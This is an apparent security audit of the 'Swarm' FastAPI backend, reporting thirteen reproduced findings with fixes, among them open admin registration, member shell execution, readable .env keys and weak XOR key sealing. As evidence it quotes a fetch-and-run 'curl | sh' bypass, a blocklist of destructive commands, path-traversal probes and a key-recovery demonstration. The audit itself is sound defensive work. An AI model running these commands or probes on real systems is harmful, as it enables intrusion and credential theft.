# Security Review — Swarm backend

Evidence-based audit of the Swarm backend, focused on the seven areas in scope:
auth rate limiting, token/cookie handling, CORS, WebSocket auth, path traversal,
secret redaction, and key sealing at rest.

Every finding below was reproduced against the running app (`fastapi.testclient`
against `backend.main:app` with a temp SQLite DB) unless it is marked as
code-reading only. Line numbers refer to the tree at the time of the audit.

Severity means **what an attacker who can reach the HTTP port can do**.

## Summary

| # | Severity | Finding | Location |
| - | -------- | ------- | -------- |
| 1 | **Critical** | Unauthenticated remote account creation, no invite/gate/rate limit; the first visitor to an unseeded instance becomes **admin** | `backend/main.py:768-806` |
| 2 | **High** | Any member can run arbitrary shell commands — and `SWARM_SYSTEM=0` does **not** disable this path, despite the deploy docs saying it does | `backend/main.py:1689-1695`, `backend/tools/computer.py:30-56` |
| 3 | **High** | `.env` is readable over HTTP; the protected-name list is write-only | `backend/tools/system.py:25`, `:131-140`, `:380-398` |
| 4 | **High** | Any **member** can rebind `SWARM_SYSTEM_ROOT` to any directory, and it persists across restarts | `backend/main.py:1705-1715` |
| 5 | **High** | Provider "sealing" is XOR with a fixed keystream, not encryption; default secret is hardcoded | `backend/ai_support/store.py:13`, `:16-27` |
| 6 | **Medium** | Unauthenticated `GET /api/status` enumerates every admin handle — the setup for #7 | `backend/main.py:714`, `:743-744` |
| 7 | **Medium** | No rate limit or lockout on `/api/register`; the admin password is brute-forceable | `backend/main.py:768-806` |
| 8 | **Medium** | No logout or token revocation; a leaked token is valid indefinitely | `backend/main.py`, `frontend/src/App.jsx:419` |
| 9 | **Medium** | `_last_write` rate-limit dict grows without bound | `backend/main.py:81`, `:87-93` |
| 10 | **Low** | Token comparison is not constant-time (inconsistent with the password path) | `backend/db.py:1121` |
| 11 | **Low** | CSV formula injection in the channel export | `backend/main.py:879-912` |
| 12 | **Info** | `_DANGEROUS` command blocklist is trivially bypassable | `backend/tools/computer.py:13-16` |
| 13 | **Info** | Bearer token in `localStorage` (XSS-exfiltratable) | `frontend/src/App.jsx:405` |

Areas that are genuinely fine are called out at the end rather than padded
with findings.

---

## 1. Critical — unauthenticated remote registration, first visitor is admin

`backend/main.py:768-806`:

```python
@app.post("/api/register")
async def api_register(payload: RegisterRequest, request: Request):
    local = is_loopback(request)
    ...
    if await db.user_count() == 0:
        if password is not None and len(password) < MIN_ADMIN_PASSWORD:
            raise HTTPException(400, ...)
        raw = db.generate_token()
        created = await db.create_user(payload.handle, raw, role="admin", password=password)
        return _session_body(payload.handle, raw, created["role"], created=True, onboarded=False)

    raw = db.generate_token()
    created = await db.create_user(payload.handle, raw, role="member")
    return _session_body(payload.handle, raw, created["role"], created=True, onboarded=onboarded)
```

There is no invite code, no approval queue, no shared secret, and no gate on
network origin. `is_loopback` is only consulted in the *existing-user* branch
(lines 775-784); a brand-new handle is accepted from any client. The route is
also the one deliberately excluded from the auth requirement, so it is
unauthenticated by design.

**Reproduced** (client address `203.0.113.9`, i.e. non-loopback):

```
first user role: admin            # empty DB, remote client
second remote register: 200 member took 0.023s
```

**Impact.** On a fresh instance whose port is reachable before the owner
registers, the first stranger gets **admin** — admin-only agent/team/tool/provider
writes. On an already-seeded instance, any stranger silently gets a valid member
token, which by finding #2 is remote shell execution on the backend host. This
is the entry point for the whole chain; #2 is what makes it critical.

**Fix.** Add an explicit opt-in. Either refuse registration once
`workspace_onboarded()` is true unless the caller presents an admin-issued
invite code, or gate the whole route behind a required `SWARM_INVITE_CODE`
compared with `hmac.compare_digest`. Make the "first user becomes admin"
promotion loopback-only, and if the DB is empty on a non-loopback request return
`409 workspace not initialized` instead of minting an admin.

---

## 2. High — member shell execution, and `SWARM_SYSTEM=0` does not disable it

`backend/main.py:1689-1695` calls straight into the tool:

```python
@app.post("/api/computer/run")
async def api_computer_run(payload: ComputerRunRequest, handle: str = Depends(require_auth)):
    if _rate_limited(handle):
        raise HTTPException(429, "slow down")
    from .tools import computer as computer_mod
    output = computer_mod.computer_run(payload.command.strip())
    return {"command": payload.command.strip(), "output": output}
```

`backend/tools/computer.py:30-56`:

```python
def computer_run(command: str) -> str:
    cmd = (command or "").strip()
    if not cmd:
        return "(need a command)"
    if _DANGEROUS.search(cmd):
        return "(blocked — that command is too destructive for the shared computer)"
    cwd = sandbox_dir()
    result = subprocess.run(cmd, shell=True, cwd=str(cwd), ...)
```

`computer_run` never consults `system.enabled()`. `SWARM_SYSTEM=0` gates
`system_*` tools only. `cwd=sandbox_dir()` looks like a boundary but is not one:
with `shell=True` the command can address any absolute path.

This contradicts the shipped guidance. `docs/DEPLOY.md:121-125` states
"`SWARM_SYSTEM` defaults to `0` in the backend: host-system tools off", and
`SECURITY.md:36-40` recommends `SWARM_SYSTEM=0` before public exposure.

**Reproduced** with `SWARM_SYSTEM=0` set:

```
system.enabled() = False
system_read('x')  = (system tools are disabled. ...)
MEMBER POST /api/computer/run -> 200 'uid=197609(uzebk) gid=197609 groups=197609\nUzeb\n'
```

**Impact.** The documented "safe to expose" configuration still executes
attacker-chosen commands as the backend user, with the full filesystem and
network of the host. With `SWARM_SYSTEM=1` the same token also gains
`system_read`/`system_write`/`system_run` inside `SWARM_SYSTEM_ROOT`.

**Fix.** Make `/api/computer/run` require `require_admin` *and* return 403 when
`system.enabled()` is false, mirroring `api_computer_system_file`
(`main.py:1721-1722`) which does check the flag. Longer term, treat
`computer_run` as a host-system tool and put it behind the same flag.

---

## 3. High — `.env` is readable; protected names are enforced on write only

`backend/tools/system.py:25`:

```python
_PROTECTED_NAMES = {".env", ".env.local", ".env.production", "swarm.db"}
```

That set is consulted in exactly one place, `_protected_write`
(`system.py:131-140`), which `system_write` calls at line 451. `system_read`
(`:380-398`) and `GET /api/computer/system/file` (`main.py:1718-1738`) apply no
such check — only a NUL-byte "is it binary" heuristic.

`.env` is the project's real key store: `backend/__init__.py:28-41` loads
`GROQ_API_KEY` and friends from it.

**Reproduced** (member token, system tools on):

```
MEMBER GET /api/computer/system/file?path=.env -> 200
   leaked: ['# get a key at https://console.groq.com  (env var name is GROQ_API_KEY)']
```

and via the tool directly:

```
system_read .env -> '.env (2828 bytes)\n# required for agents to actually respond ...'
```

A plain text file containing a live-looking key is returned verbatim:

```
TEXT file with real key -> 200 | key value returned: True
```

**Impact.** Any member (see #1 — free to mint) reads every provider API key in
`.env`, defeating the sealed store in finding #5 entirely.

Note the SQLite DB itself is *not* reachable this way — the binary guard
returns `415`:

```
binary-guarded DB read -> 415 binary file
```

but that guard is trivially sidestepped by `system_run` (e.g. `sqlite3`,
`cp`, `python -c`) whenever system tools are on, which is the Docker default
for `.env.example` users. Fix the read path, not just the preview path.

**Fix.** Apply `_protected_write` (rename to `_protected_path`) to reads as
well, or invert it: maintain an explicit read/write distinction and refuse
reads of `_PROTECTED_NAMES` unconditionally. Prefer a denylist keyed on
`.env*` and the DB path over the current four-entry set.

---

## 4. High — a member can rebind the system root, and it persists

`backend/main.py:1705-1715`:

```python
@app.post("/api/computer/system/root")
async def api_computer_system_root(
    payload: SystemRootSet, handle: str = Depends(require_auth)
):
    if _rate_limited(handle):
        raise HTTPException(429, "slow down")
    from .tools import system as system_mod
    result = await system_mod.set_root(payload.path)
```

The dependency is `require_auth`, not `require_admin`, unlike every other
mutating configuration route (`/api/browser/close` at `:1748`,
`/api/connectors/{id}/connect` at `:1772`, `/api/composio/connect` at `:1807`).
`set_root` writes through `db.set_workspace_meta` (`system.py:285`), and
`hydrate_root` (`system.py:258-270`) re-applies it at every startup, so the
rebind survives restarts. `_validate_root` only refuses the filesystem root
itself (`system.py:77-78`), so any ordinary directory is accepted — including
`~`, `~/.ssh`, or the project directory.

**Reproduced** with a member token:

```
MEMBER set system root -> 200 | now root = C:\Users\uzebk
```

**Impact.** A member relocates the entire `system_*` tool surface — read,
write, and shell — to any directory the backend user can reach, and keeps it
there across restarts. Combined with #3 this is a direct route to every file
on the host.

**Fix.** Require `require_admin` on this route, consistent with the other
configuration writes. Consider requiring the root to be an explicit member of
`system.places()` (`system.py:143-164`) rather than any existing directory.

---

## 5. High — key sealing is XOR with a fixed keystream

`backend/ai_support/store.py:13` and `:16-27`:

```python
_SECRET = (os.environ.get("SWARM_SECRET") or "swarm-local-dev-secret").encode()

def _seal(raw: str) -> str:
    key = hashlib.sha256(_SECRET).digest()
    data = raw.encode("utf-8")
    xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    return base64.urlsafe_b64encode(xored).decode("ascii")
```

This is a repeating-key XOR pad. It is **not** encryption, and it is not
confidentiality-preserving against an attacker who has the database. Three
independent properties were confirmed by executing the real functions:

```
SWARM_SECRET set? False | _SECRET = b'swarm-local-dev-secret'
sealed: pwBXGsk4523l24XF922alKb1PHTonOIB
known-plaintext('gsk_') recovers rest: gsk_REALKEY_AAAABBBBCCCC
tampered unseal (no MAC) -> gsk_REALKEX_AAAABBBBCCCC
```

1. **Hardcoded fallback.** With `SWARM_SECRET` unset — the default — the key is
   the literal string `swarm-local-dev-secret`, published in a public repo.
2. **Known-plaintext recovery.** Provider keys have fixed, documented
   prefixes (`gsk_`, `sk-ant-`, …). Because the keystream is positionally
   fixed, four known prefix bytes recover the **entire** remaining key, as the
   run above shows. No password cracking is required.
3. **No integrity.** There is no MAC or AEAD tag, so a single flipped
   ciphertext byte silently produces a corrupted key (last line) rather than an
   error.

**What it does protect:** a casual `SELECT * FROM ai_providers` does not show
plaintext, so it is meaningfully better than storing the key raw. **What it
does not protect:** anyone with the DB file. Precisely — the seal defends
against disclosure through the *API*, not against disclosure of the database
file or a backup of it.

Related, minor: `db.py:1891` builds the hint from the *sealed blob*
(`secret[-4:]`), not the plaintext, so `key_hint` is a fingerprint of the
ciphertext rather than of the operator's key. Not a leak, just not what the
field name implies.

**Fix.** Use authenticated encryption — `AESGCM` from `cryptography` with the
key derived via `hashlib.pbkdf2_hmac`/`scrypt` from `SWARM_SECRET` and a stored
salt, or `Fernet`. Refuse to start, or refuse to store, when `SWARM_SECRET` is
unset rather than silently using a public default. Keep the ciphertext format
versioned so existing rows can be migrated on first read.

---

## 6. Medium — unauthenticated admin-handle enumeration

`backend/main.py:714` uses `optional_auth`, and `:743-744` publishes the admin
list regardless of authentication:

```python
@app.get("/api/status")
async def api_status(handle: str | None = Depends(optional_auth)):
    ...
    body["onboarded"] = await db.workspace_onboarded()
    body["admins"] = await db.list_admin_handles()
```

**Reproduced** with no `Authorization` header at all:

```
UNAUTH /api/status -> 200 | admins leaked: ['alice'] | onboarded: False
```

**Impact.** Gives an attacker the exact handle to target for #7, and confirms
whether the instance has been seeded. `onboarded` also signals whether
registration is worth attempting.

**Fix.** Move `admins` behind the `if handle:` block (line 745), which is
already the authenticated-only section.

---

## 7. Medium — no rate limit or lockout on registration

`api_register` (`main.py:768-806`) is the only mutating route in the file that
never calls `_rate_limited` (`main.py:87-93`), and there is no attempt
counter or lockout in `db.py`.

**Reproduced** — 40 consecutive guesses against a password-protected admin:

```
admin-password guesses: 40 attempts in 4.26s, statuses allowed=403
```

All 40 were accepted for evaluation; none were throttled.

**Impact.** `db.py:283-299` uses PBKDF2-HMAC-SHA256 at 100,000 rounds, which
sets a real throughput ceiling — this is not a free-for-all. But
`MIN_ADMIN_PASSWORD = 4` (`main.py:755`) permits trivially guessable secrets,
`/api/status` hands over the handle (#6), and there is no lockout to stop
online guessing over days.

**Fix.** Apply `_rate_limited` (or a dedicated per-handle + per-IP limiter) to
`/api/register`, and add exponential backoff with lockout after N consecutive
`403`s on the admin-password branch.

---

## 8. Medium — no logout or token revocation

Tokens have no expiry (`db.py:1124-1125` — `secrets.token_urlsafe(32)`, stored
as a bare SHA-256 digest at `:276-277`) and there is no revocation endpoint.
A grep for `logout`, `revoke`, and `delete_user` across `backend/` returns
nothing. The frontend sign-out only clears browser storage
(`frontend/src/App.jsx:419-420`):

```javascript
localStorage.removeItem("swarm_token");
localStorage.removeItem("swarm_handle");
```

The only way to invalidate a token is for the owner to call `/api/register`
again with the same handle, which happens to call `rotate_user_token`
(`main.py:785-786`). That is a side effect of re-registering, not a designed
revocation path, and it is not discoverable by an operator.

**Impact.** A leaked token (shared machine, backup, `localStorage` XSS per #13)
remains valid until the process restarts *and* the owner re-registers. There
is no supported way to cut off access to a compromised account.

**Fix.** Add `DELETE /api/me/token` that nulls or rotates `token_hash`, plus a
`POST /api/logout`. Add an expiry timestamp checked in `verify_token`
(`db.py:1115-1121`), with a documented refresh path.

---

## 9. Medium — unbounded rate-limit map

`backend/main.py:79-93`:

```python
RATE_LIMIT_SECONDS = 0.5
_last_write: dict[str, float] = {}
...
def _rate_limited(handle: str) -> bool:
    now = time.time()
    last = _last_write.get(handle, 0.0)
    if now - last < RATE_LIMIT_SECONDS:
        return True
    _last_write[handle] = now
    return False
```

Entries are never evicted, and there is no bound. The key is the caller's
handle — and by finding #1 an unauthenticated attacker can mint unlimited
distinct handles and drive unbounded growth of a process-lifetime dict.

**Impact.** Slow memory exhaustion over a long-lived process. Modest on its
own, but it is an unauthenticated amplification path.

**Fix.** Bound the dict (evict the oldest entries past a cap, or sweep entries
older than `RATE_LIMIT_SECONDS` on write) and/or key the limiter on the client
address with a fixed-size ring.

---

## 10. Low — token comparison is not constant-time

`backend/db.py:1115-1121`:

```python
async def verify_token(handle: str, token: str) -> bool:
    ...
    return row[0] == hash_token(token)
```

Plain `==` on a hex digest short-circuits at the first differing byte. The
password path in the same file does the right thing
(`db.py:289-299`, `hmac.compare_digest`), so this is an internal inconsistency
as much as a weakness. Remote timing exploitation against a 256-bit hash is
impractical in practice.

**Fix.** `hmac.compare_digest(row[0], hash_token(token))`.

---

## 11. Low — CSV formula injection in channel export

`backend/main.py:879-912`:

```python
writer.writerow([
    row["id"], created, row["author"], row["author_kind"],
    row.get("parent_id") or "", row["body"],
])
```

Message bodies are user-controlled and written to CSV unescaped. A body
beginning with `=`, `+`, `-`, or `@` is interpreted as a formula when the
export is opened in Excel or Sheets.

Access control is correct here — `_require_channel` (`main.py:885`) enforces
`can_view_channel`, so an attacker can only poison an export the victim
themselves requests. Severity is limited by that.

**Fix.** Prefix a single quote, or prepend a tab, to cells starting with those
four characters (`csv.writer` has no built-in sanitizer).

---

## 12. Info — the destructive-command blocklist is a speed bump

`backend/tools/computer.py:13-16`:

```python
_DANGEROUS = re.compile(
    r"(rm\s+-rf\s+/(\s|$)|mkfs\b|dd\s+if=|: \(\) \{|fork\s*bomb|/dev/sd[a-z])",
    re.I,
)
```

Only the literal `rm -rf /` spelling is matched. Confirmed:

```
'rm -rf /'    -> (blocked — that command is too destructive ...)
'rm -fr /'    -> "(exit 1)\nrm: it is dangerous to operate recursively on '/'"
'curl http://x | sh' -> ran
```

GNU `rm` itself refuses the near-miss, so the guard is not the thing stopping
deletion — and it is irrelevant next to finding #2, where the shell is
unrestricted anyway. Listed for completeness, not because the fix is urgent.

**Fix.** Do not invest in enlarging the regex. If the shell is exposed at all
(finding #2), rely on that exposure being intentional and admin-gated rather
than on a blocklist.

---

## 13. Info — bearer token in `localStorage`

`frontend/src/App.jsx:405`:

```javascript
localStorage.setItem("swarm_token", res.data.token);
```

A token in `localStorage` is readable by any script on the origin, so an XSS
becomes full account compromise. This is the standard trade-off against
`httpOnly` cookies, and this codebase does not use cookies for auth at all (no
`set_cookie` in `backend/`), which is the simpler and less CSRF-prone design.

**Fix.** No change required unless the `X-Swarm-Client` header pattern is
abandoned; if XSS surface grows, move to a `SameSite=Strict; Secure; HttpOnly`
cookie and rely on the existing origin guard for CSRF.

---

## Verified as sound

Not every area produced a finding. These were checked and are correct:

- **Sandbox path traversal — genuinely blocked.** `_safe_workspace_path`
  (`agent.py:256-267`) resolves and then enforces `target.relative_to(base)`,
  and `safe_path` (`system.py:115-128`) does the same against the system root.
  Probes against `GET /api/computer/file` with `../../../../etc/hosts`,
  `..\..\..\windows\win.ini`, `/etc/passwd`, and `C:/Windows/win.ini` all
  returned `404`; `system_read("../../../../../../etc/hosts")` and
  `safe_path("../")` were refused. The `../` escapes the task asked about do
  not work.
- **WS `author`/`author_kind` cannot be spoofed.** `main.py:1927` hardcodes
  both — `db.add_message(channel_id, handle, body, "human", parent_id)` — using
  the handshake handle, never frame data. The REST equivalent enforces the same
  invariant at `main.py:919-920`. Client-supplied `author` in a frame is
  ignored.
- **WS handshake.** Token must arrive in the first frame and is verified before
  `hub.join` (`main.py:1859-1872`); a missing/invalid token closes with `4001`,
  and `can_view_channel` is enforced at `:1867`. `last_seen_id` only selects
  which history to replay to the already-authenticated socket — it grants no
  access, so a spoofed or negative cursor is not a privilege issue. The
  `/api/v2/ws/runs/{run_id}` handler (`main.py:666-694`) additionally scopes
  every query to the authenticated owner.
- **Secrets are not echoed by any API.** `store.status()` (`store.py:46-57`)
  projects only `provider_id`/`model`/`connected_at`/`key_hint`; the
  `db.list_ai_providers()` and `get_ai_provider()` rows that carry `secret` are
  consumed only by `resolve_key`/`_refresh_oauth` and by the explicit-field
  builders at `store.py:108-118`. No route returns a raw row.
- **Artifact download is traversal-safe.** `main.py:427-431` resolves the stored
  URI and requires `root in target.parents`; `v2.create_artifact` sanitises with
  `Path(name).name` and re-checks `root not in target.parents`
  (`v2.py:383-389`).
- **Admin authorization on configuration writes** is correct everywhere except
  finding #4.
- **The origin guard does not fail open for browsers.** `install_api_guard`
  (`security.py:79-96`) rejects an unlisted `Origin` (403) and requires
  `X-Swarm-Client: web` when an `Origin` is present. Verified: evil origin →
  `403`; allowed origin without the marker → `403`; with both → `200`. The
  `origin_allowed(None) → True` path is the standard non-browser case and is
  safe here because auth is a bearer header, not a cookie.

## Fix applied during this review

One defensive change, in `backend/security.py:15-23` — the only file I touched
outside this document:

`SWARM_ALLOWED_ORIGINS=*` previously reached `CORSMiddleware` at
`main.py:70` alongside `allow_credentials=True` (`main.py:71`), which reflected
any origin onto credentialed responses, while `origin_allowed` treated `"*"` as
a literal that matches nothing — one layer open, the other shut. `allowed_origins`
now drops bare `*` entries:

```python
return {o.strip() for o in raw.split(",") if o.strip() and o.strip() != "*"}
```

Verified: `SWARM_ALLOWED_ORIGINS="*"` → `allowed_origins() == set()`;
`"http://a.example, *, http://b.example"` → `{'http://a.example',
'http://b.example'}`; the default localhost set is unchanged. `Origin`-less and
non-`/api/` requests are unaffected.

No fix was applied for findings #1-#5, #7-#9: each needs a product decision
(registration policy, admin gating, key format migration) rather than a
one-line change, and this file is a review, not the fix.

## Test status

`./.venv/Scripts/python.exe -m pytest -q` → **162 passed, 0 failed** (87s),
with the `backend/security.py` change from this review applied.

An earlier run mid-audit showed 1 failure,
`tests/test_v3.py::test_demo_seed_general_thread`, asserting
`"What's blocking the release?"` against a seeded
`"Morning. What's blocking the release?"`. That was a concurrent, unrelated
edit landing in this working tree (`backend/db.py` seeded line 593 vs the
assertion at `tests/test_v3.py:34`) and it cleared on the final run; it is
unrelated to this audit.